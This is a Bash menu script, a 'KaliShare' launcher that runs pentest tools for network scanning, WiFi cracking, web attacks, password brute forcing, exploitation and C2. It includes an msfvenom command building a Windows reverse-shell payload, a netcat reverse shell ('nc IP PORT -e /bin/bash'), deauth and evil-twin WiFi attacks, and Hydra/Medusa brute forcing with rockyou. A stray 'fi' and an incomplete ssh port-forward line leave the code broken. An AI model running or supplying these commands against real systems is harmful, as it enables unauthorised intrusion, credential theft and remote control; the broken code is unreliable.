#!/bin/bash
# ====================================================================
# TOOL WIDGET - Interactive Tool Launcher
# One-click script execution with TUI
# ====================================================================

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
KALI_SHARE="${SCRIPT_DIR}/.."
WIDGETS_DIR="${KALI_SHARE}/widgets"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

log() { echo -e "${GREEN}[*]${NC} $1"; }
warn() { echo -e "${YELLOW}[!]${NC} $1"; }
error() { echo -e "${RED}[X]${NC} $1"; }

show_header() {
    clear
    echo -e "${CYAN}╔══════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║       KALISHARE TOOL WIDGET v1.0                      ║${NC}"
    echo -e "${CYAN}║       One-Click Pentest Tools                        ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════════════╝${NC}"
    echo ""
}

show_menu() {
    echo -e "${YELLOW}┌─────────────────────────────────────────────────────────┐${NC}"
    echo -e "${YELLOW}│ CATEGORY SELECTION                                      │${NC}"
    echo -e "${YELLOW}└─────────────────────────────────────────────────────────┘${NC}"
    echo ""
    echo "  ${GREEN}1)${NC} Network Scan     - Nmap, masscan, netdiscover"
    echo "  ${GREEN}2)${NC} WiFi Audit       - Aircrack, reaver, wifite"
    echo "  ${GREEN}3)${NC} Web Testing      - Nikto, sqlmap, gobuster"
    echo "  ${GREEN}4)${NC} Password Attack - Hashcat, john, crowbar"
    echo "  ${GREEN}5)${NC} Exploitation     - Metasploit, searchsploit"
    echo "  ${GREEN}6)${NC} Reconnaissance   - Whois, dnsenum, theHarvester"
    echo "  ${GREEN}7)${NC} AI Tools         - HexStrike, OpenCode, Ollama"
    echo "  ${GREEN}8)${NC} System Info      - Hardware, network status"
    echo "  ${GREEN}9)${NC} Recovery         - Boot tools, password reset"
    echo "  ${GREEN}0)${NC} Quick Commands   - Common one-liners"
    echo ""
    echo -e "${YELLOW}┌─────────────────────────────────────────────────────────┐${NC}"
    echo -e "${YELLOW}│ SHORTCUTS                                              │${NC}"
    echo -e "${YELLOW}└─────────────────────────────────────────────────────────┘${NC}"
    echo ""
    echo "  ${CYAN}F1)${NC} Install All Tools   ${CYAN}F2)${NC} Update Tools"
    echo "  ${CYAN}F3)${NC} Backup Config       ${CYAN}F4)${NC} System Check"
    echo ""
    echo -e "  ${RED}q/Q)${NC} Quit"
    echo ""
}

run_network_scan() {
    echo -e "${BLUE}┌─────────────────────────────────────────────────────────┐${NC}"
    echo -e "${BLUE}│ NETWORK SCAN TOOLS                                    │${NC}"
    echo -e "${BLUE}└─────────────────────────────────────────────────────────┘${NC}"
    echo ""
    echo "  ${GREEN}1)${NC} Quick Scan        - nmap -sn TARGET"
    echo "  ${GREEN}2)${NC} Full Port Scan    - nmap -p- -sV TARGET"
    echo "  ${GREEN}3)${NC} UDP Scan          - nmap -sU TARGET"
    echo "  ${GREEN}4)${NC} Fast Scan         - masscan -p1-65535 TARGET"
    echo "  ${GREEN}5)${NC} Service Detection - nmap -sV -sC TARGET"
    echo "  ${GREEN}6)${NC} OS Detection      - nmap -O TARGET"
    echo "  ${GREEN}7)${NC} Vuln Scan         - nmap --script vuln TARGET"
    echo "  ${GREEN}8)${NC} Net Discover      - netdiscover -r TARGET"
    echo "  ${GREEN}0)${NC} Back to Main"
    echo ""
    read -p "Select tool [0-8]: " choice
    
    case $choice in
        1) read -p "Enter target IP: " target; log "Running quick scan..."; nmap -sn "$target" ;;
        2) read -p "Enter target IP: " target; log "Running full port scan..."; nmap -p- -sV "$target" ;;
        3) read -p "Enter target IP: " target; log "Running UDP scan..."; nmap -sU "$target" ;;
        4) read -p "Enter target IP: " target; log "Running fast scan..."; masscan -p1-65535 "$target" ;;
        5) read -p "Enter target IP: " target; log "Running service detection..."; nmap -sV -sC "$target" ;;
        6) read -p "Enter target IP: " target; log "Running OS detection..."; nmap -O "$target" ;;
        7) read -p "Enter target IP: " target; log "Running vuln scan..."; nmap --script vuln "$target" ;;
        8) read -p "Enter target range: " target; log "Running netdiscover..."; netdiscover -r "$target" ;;
        0) return ;;
    esac
}

run_wifi_audit() {
    echo -e "${BLUE}┌─────────────────────────────────────────────────────────┐${NC}"
    echo -e "${BLUE}│ WIFI AUDIT TOOLS                                      │${NC}"
    echo -e "${BLUE}└─────────────────────────────────────────────────────────┘${NC}"
    echo ""
    echo "  ${GREEN}1)${NC} Monitor Mode     - Enable wireless monitor"
    echo "  ${GREEN}2)${NC} Scan Networks    - airodump-ng wlan0mon"
    echo "  ${GREEN}3)${NC} Capture Handshake - airodump + deauth"
    echo "  ${GREEN}4)${NC} Crack WPA        - hashcat/aircrack-ng"
    echo "  ${GREEN}5)${NC} WPS Attack        - reaver/bully"
    echo "  ${GREEN}6)${NC} Evil Twin        - airbase-ng"
    echo "  ${GREEN}7)${NC} Wifite            - Automated WiFi auditor"
    echo "  ${GREEN}8)${NC} Fluxion          - WiFi cracking framework"
    echo "  ${GREEN}0)${NC} Back to Main"
    echo ""
    read -p "Select tool [0-8]: " choice
    
    case $choice in
        1) log "Starting monitor mode..."; airmon-ng start wlan0 ;;
        2) log "Scanning networks..."; airodump-ng wlan0mon ;;
        3) read -p "Enter BSSID: " bssid; log "Starting capture..."; airodump-ng --bssid "$bssid" -w handshake wlan0mon ;;
        4) read -p "Enter handshake file: " file; log "Cracking..."; aircrack-ng "$file" -w /usr/share/wordlists/rockyou.txt ;;
        5) read -p "Enter BSSID: " bssid; log "Starting WPS attack..."; reaver -i wlan0mon -b "$bssid" -vv ;;
        6) read -p "Enter SSID: " ssid; log "Starting AP..."; airbase-ng -e "$ssid" wlan0mon ;;
        7) log "Starting wifite..."; wifite ;;
        8) log "Starting fluxion..."; fluxion ;;
        0) return ;;
    esac
}

run_web_testing() {
    echo -e "${BLUE}┌─────────────────────────────────────────────────────────┐${NC}"
    echo -e "${BLUE}│ WEB TESTING TOOLS                                     │${NC}"
    echo -e "${BLUE}└─────────────────────────────────────────────────────────┘${NC}"
    echo ""
    echo "  ${GREEN}1)${NC} Nikto Scan        - Web vulnerability scanner"
    echo "  ${GREEN}2)${NC} SQLMap            - SQL injection"
    echo "  ${GREEN}3)${NC} Gobuster          - Directory enumeration"
    echo "  ${GREEN}4)${NC} Directory Buster  - dirb"
    echo "  ${GREEN}5)${NC} WhatWeb           - CMS detection"
    echo "  ${GREEN}6)${NC} WPScan            - WordPress scanner"
    echo "  ${GREEN}7)${NC} SSL Scan          - testssl.sh"
    echo "  ${GREEN}8)${NC} ZAP Proxy         - OWASP ZAP"
    echo "  ${GREEN}0)${NC} Back to Main"
    echo ""
    read -p "Select tool [0-8]: " choice
    
    case $choice in
        1) read -p "Enter target URL: " target; log "Running nikto..."; nikto -h "$target" ;;
        2) read -p "Enter target URL: " target; log "Running sqlmap..."; sqlmap -u "$target" --batch ;;
        3) read -p "Enter target URL: " target; log "Running gobuster..."; gobuster dir -u "$target" -w /usr/share/wordlists/dirb/big.txt ;;
        4) read -p "Enter target URL: " target; log "Running dirb..."; dirb "$target" ;;
        5) read -p "Enter target URL: " target; log "Running whatweb..."; whatweb "$target" ;;
        6) read -p "Enter target URL: " target; log "Running wpscan..."; wpscan --url "$target" ;;
        7) log "Running testssl.sh..."; testssl.sh ;;
        8) log "Starting OWASP ZAP..."; zaproxy ;;
        0) return ;;
    esac
}

run_password_attack() {
    echo -e "${BLUE}┌─────────────────────────────────────────────────────────┐${NC}"
    echo -e "${BLUE}│ PASSWORD ATTACK TOOLS                                 │${NC}"
    echo -e "${BLUE}└─────────────────────────────────────────────────────────┘${NC}"
    echo ""
    echo "  ${GREEN}1)${NC} Hashcat           - GPU password cracking"
    echo "  ${GREEN}2)${NC} John the Ripper   - CPU password cracking"
    echo "  ${GREEN}3)${NC} Hydra             - Online password attack"
    echo "  ${GREEN}4)${NC} Crowbar           - Remote brute force"
    echo "  ${GREEN}5)${NC} Medusa           - Parallel login brute"
    echo "  ${GREEN}6)${NC} Hash ID          - Identify hash type"
    echo "  ${GREEN}7)${NC} Wordlists        - Manage wordlists"
    echo "  ${GREEN}0)${NC} Back to Main"
    echo ""
    read -p "Select tool [0-7]: " choice
    
    case $choice in
        1) read -p "Enter hash file: " file; read -p "Enter wordlist: " wl; log "Running hashcat..."; hashcat -m 0 "$file" "$wl" ;;
        2) read -p "Enter hash file: " file; log "Running john..."; john "$file" ;;
        3) read -p "Enter target: " target; read -p "Enter service: " svc; log "Running hydra..."; hydra -L /usr/share/wordlists/usernames.txt -P /usr/share/wordlists/rockyou.txt "$target" "$svc" ;;
        4) read -p "Enter target: " target; log "Running crowbar..."; crowbar -b rdp -s "$target" -U /usr/share/wordlists/usernames.txt -C /usr/share/wordlists/rockyou.txt ;;
        5) read -p "Enter target: " target; log "Running medusa..."; medusa -h "$target" -U /usr/share/wordlists/usernames.txt -P /usr/share/wordlists/rockyou.txt ;;
        6) log "Identifying hash..."; hashid ;;
        7) log "Wordlist location: /usr/share/wordlists/"; ls -la /usr/share/wordlists/ ;;
        0) return ;;
    esac
}

run_exploitation() {
    echo -e "${BLUE}┌─────────────────────────────────────────────────────────┐${NC}"
    echo -e "${BLUE}│ EXPLOITATION TOOLS                                    │${NC}"
    echo -e "${BLUE}└─────────────────────────────────────────────────────────┘${NC}"
    echo ""
    echo "  ${GREEN}1)${NC} Metasploit        - msfconsole"
    echo "  ${GREEN}2)${NC} Searchsploit      - Exploit database"
    echo "  ${GREEN}3)${NC} msfvenom          - Create payloads"
    echo "  ${GREEN}4)${NC} Empire            - Post-exploitation"
    echo "  ${GREEN}5)${NC} Covenant          - C2 framework"
    echo "  ${GREEN}6)${NC} Koadic            - Windows post-exploit"
    echo "  ${GREEN}7)${NC} CrackMapExec      - Network exploitation"
    echo "  ${GREEN}0)${NC} Back to Main"
    echo ""
    read -p "Select tool [0-7]: " choice
    
    case $choice in
        1) log "Starting Metasploit..."; msfconsole ;;
        2) read -p "Enter search term: " term; log "Searching..."; searchsploit "$term" ;;
        3) log "Creating payload..."; msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > payload.exe ;;
        4) log "Starting Empire..."; empire ;;
        5) log "Starting Covenant..."; dotnet run --project /opt/Covenant/Covenant ;;
        6) log "Starting Koadic..."; koadic ;;
        7) read -p "Enter target: " target; log "Running CME..."; crackmapexec "$target" ;;
        0) return ;;
    esac
}

run_reconnaissance() {
    echo -e "${BLUE}┌─────────────────────────────────────────────────────────┐${NC}"
    echo -e "${BLUE}│ RECONNAISSANCE TOOLS                                  │${NC}"
    echo -e "${BLUE}└─────────────────────────────────────────────────────────┘${NC}"
    echo ""
    echo "  ${GREEN}1)${NC} Whois             - Domain info"
    echo "  ${GREEN}2)${NC} DNSenum          - DNS enumeration"
    echo "  ${GREEN}3)${NC} DNSMap           - DNS mapping"
    echo "  ${GREEN}4)${NC} theHarvester     - Email gathering"
    fi
    echo "  ${GREEN}5)${NC} Sublist3r        - Subdomain enumeration"
    echo "  ${GREEN}6)${NC} Recon-ng         - Web reconnaissance"
    echo "  ${GREEN}7)${NC} SpiderFoot       - OSINT automation"
    echo "  ${GREEN}8)${NC} Maltego          - Link analysis"
    echo "  ${GREEN}0)${NC} Back to Main"
    echo ""
    read -p "Select tool [0-8]: " choice
    
    case $choice in
        1) read -p "Enter domain: " target; whois "$target" ;;
        2) read -p "Enter domain: " target; dnsenum "$target" ;;
        3) read -p "Enter domain: " target; dnsmap "$target" ;;
        4) read -p "Enter domain: " target; theHarvester -d "$target" -b all ;;
        5) read -p "Enter domain: " target; sublist3r -d "$target" ;;
        6) log "Starting recon-ng..."; recon-ng ;;
        7) log "Starting spiderfoot..."; spiderfoot -s 127.0.0.1:5001 ;;
        8) log "Starting maltego..."; maltego ;;
        0) return ;;
    esac
}

run_ai_tools() {
    echo -e "${BLUE}┌─────────────────────────────────────────────────────────┐${NC}"
    echo -e "${BLUE}│ AI TOOLS                                              │${NC}"
    echo -e "${BLUE}└─────────────────────────────────────────────────────────┘${NC}"
    echo ""
    echo "  ${GREEN}1)${NC} HexStrike         - AI Pentest Assistant"
    echo "  ${GREEN}2)${NC} OpenCode          - AI Coding Agent"
    echo "  ${GREEN}3)${NC} Ollama             - Local LLM"
    echo "  ${GREEN}4)${NC} HuggingFace       - AI Models"
    echo "  ${GREEN}5)${NC} GPT4All           - Offline AI"
    echo "  ${GREEN}6)${NC} LocalAI           - Self-hosted AI"
    echo "  ${GREEN}7)${NC} ExLlamaV2         - Local LLM inference"
    echo "  ${GREEN}8)${NC} KoboldCPP         - AI Story generation"
    echo "  ${GREEN}0)${NC} Back to Main"
    echo ""
    read -p "Select tool [0-8]: " choice
    
    case $choice in
        1) log "Starting HexStrike..."; cd /root/hexstrike-ai && ./hexstrike_mcp.py ;;
        2) log "Starting OpenCode..."; opencode ;;
        3) log "Starting Ollama..."; ollama serve ;;
        4) log "HuggingFace CLI..."; python -c "from huggingface_hub import snapshot_download; snapshot_download()" ;;
        5) log "Starting GPT4All..."; gpt4all ;;
        6) log "Starting LocalAI..."; localai ;;
        7) log "Starting ExLlamaV2..."; cd /opt/ExLlamaV2 && python inference.py ;;
        8) log "Starting KoboldCPP..."; koboldcpp ;;
        0) return ;;
    esac
}

run_system_info() {
    echo -e "${BLUE}┌─────────────────────────────────────────────────────────┐${NC}"
    echo -e "${BLUE}│ SYSTEM INFORMATION                                     │${NC}"
    echo -e "${BLUE}└─────────────────────────────────────────────────────────┘${NC}"
    echo ""
    echo "  ${GREEN}1)${NC} System Info       - uname, hardware"
    echo "  ${GREEN}2)${NC} Network Status    - IP, interfaces"
    echo "  ${GREEN}3)${NC} Disk Usage        - df, fdisk"
    echo "  ${GREEN}4)${NC} Running Services  - netstat, ss"
    echo "  ${GREEN}5)${NC} Process List      - ps, top"
    echo "  ${GREEN}6)${NC} Memory Info       - free, vmstat"
    echo "  ${GREEN}7)${NC} User Info         - who, last"
    echo "  ${GREEN}8)${NC} Full Diagnostics  - All above"
    echo "  ${GREEN}0)${NC} Back to Main"
    echo ""
    read -p "Select option [0-8]: " choice
    
    case $choice in
        1) uname -a; lshw | head -20 ;;
        2) ip addr; route -n; ss -tuln ;;
        3) df -h; fdisk -l | grep -E "^/dev" ;;
        4) netstat -tuln; ss -tuln ;;
        5) ps aux | head -20; top -bn1 | head -15 ;;
        6) free -h; vmstat 1 5 ;;
        7) who; last -10 ;;
        8) echo "=== SYSTEM ===" && uname -a && echo "=== NETWORK ===" && ip addr && echo "=== DISK ===" && df -h && echo "=== PROCESSES ===" && ps aux | wc -l ;;
        0) return ;;
    esac
}

run_recovery() {
    echo -e "${BLUE}┌─────────────────────────────────────────────────────────┐${NC}"
    echo -e "${BLUE}│ RECOVERY TOOLS                                         │${NC}"
    echo -e "${BLUE}└─────────────────────────────────────────────────────────┘${NC}"
    echo ""
    echo "  ${GREEN}1)${NC} Boot Menu         - Boot takeover tools"
    echo "  ${GREEN}2)${NC} Windows Reset     - Reset Windows password"
    echo "  ${GREEN}3)${NC} chntpw            - NT password reset"
    echo "  ${GREEN}4)${NC} SystemRescue      - System rescue tools"
    echo "  ${GREEN}5)${NC} Clonezilla        - Disk imaging"
    echo "  ${GREEN}6)${NC} GParted           - Partition editor"
    echo "  ${GREEN}7)${NC} TestDisk          - Data recovery"
    echo "  ${GREEN}8)${NC} Photorec          - File recovery"
    echo "  ${GREEN}0)${NC} Back to Main"
    echo ""
    read -p "Select tool [0-8]: " choice
    
    case $choice in
        1) log "Starting boot menu..."; bash "${KALI_SHARE}/scripts/boot-takeover-tools.sh" ;;
        2) log "Starting Windows password reset..."; bash "${KALI_SHARE}/scripts/skeleton-key/start.sh" ;;
        3) log "Starting chntpw..."; chntpw -i ;;
        4) log "Starting systemrescue..."; systemrescue ;;
        5) log "Starting Clonezilla..."; clonezilla ;;
        6) log "Starting GParted..."; gparted ;;
        7) log "Starting TestDisk..."; testdisk ;;
        8) log "Starting PhotoRec..."; photorec ;;
        0) return ;;
    esac
}

run_quick_commands() {
    echo -e "${BLUE}┌─────────────────────────────────────────────────────────┐${NC}"
    echo -e "${BLUE}│ QUICK COMMANDS                                         │${NC}"
    echo -e "${BLUE}└─────────────────────────────────────────────────────────┘${NC}"
    echo ""
    echo "  ${GREEN}1)${NC} Find files        - find / -name *.exe"
    echo "  ${GREEN}2)${NC} Find exploits     - searchsploit -c"
    echo "  ${GREEN}3)${NC} Quick reverse     - nc -e /bin/bash"
    echo "  ${GREEN}4)${NC} Port forward      - ssh -L"
    echo "  ${GREEN}5)${NC} Download file     - wget/curl"
    echo "  ${GREEN}6)${NC} Base64 encode     - echo | base64"
    echo "  ${GREEN}7)${NC} Hash file         - md5sum/sha256sum"
    echo "  ${GREEN}8)${NC} Extract archive   - tar/7z/unzip"
    echo "  ${GREEN}0)${NC} Back to Main"
    echo ""
    read -p "Select command [0-8]: " choice
    
    case $choice in
        1) read -p "Enter name pattern: " pat; find / -name "$pat" 2>/dev/null | head -20 ;;
        2) read -p "Enter search: " term; searchsploit -c "$term" ;;
        3) read -p "Enter target IP: " ip; read -p "Enter port: " port; nc "$ip" "$port" -e /bin/bash ;;
        4) read -p "Enter local port: " lport; read -p "Enter remote: " remote; ssh -L "$lport":localhost: "$remote" ;;
        5) read -p "Enter URL: " url; read -p "Enter output: " out; wget -O "$out" "$url" ;;
        6) read -p "Enter text: " txt; echo "$txt" | base64 ;;
        7) read -p "Enter filename: " file; md5sum "$file"; sha256sum "$file" ;;
        8) read -p "Enter archive: " arc; 7z x "$arc" ;;
        0) return ;;
    esac
}

run_shortcut() {
    case $1 in
        1) log "Installing all tools..."; bash "${KALI_SHARE}/scripts/install-all-kali.sh" ;;
        2) log "Updating tools..."; apt update && apt upgrade -y ;;
        3) log "Backing up config..."; tar -czf config-backup-$(date +%Y%m%d).tar.gz ~/.bashrc ~/.zshrc /etc/*.conf 2>/dev/null ;;
        4) log "Running system check..."; echo "=== CPU ===" && lscpu | head -5 && echo "=== MEM ===" && free -h && echo "=== DISK ===" && df -h && echo "=== NETWORK ===" && ip addr | grep inet ;;
        *) warn "Unknown shortcut" ;;
    esac
}

main() {
    while true; do
        show_header
        show_menu
        read -p "Select option: " choice
        
        case $choice in
            1) run_network_scan ;;
            2) run_wifi_audit ;;
            3) run_web_testing ;;
            4) run_password_attack ;;
            5) run_exploitation ;;
            6) run_reconnaissance ;;
            7) run_ai_tools ;;
            8) run_system_info ;;
            9) run_recovery ;;
            0) run_quick_commands ;;
            F1) run_shortcut 1 ;;
            F2) run_shortcut 2 ;;
            F3) run_shortcut 3 ;;
            F4) run_shortcut 4 ;;
            q|Q) log "Goodbye!"; exit 0 ;;
            *) warn "Invalid option" ;;
        esac
        
        echo ""
        read -p "Press Enter to continue..."
    done
}

main "$@"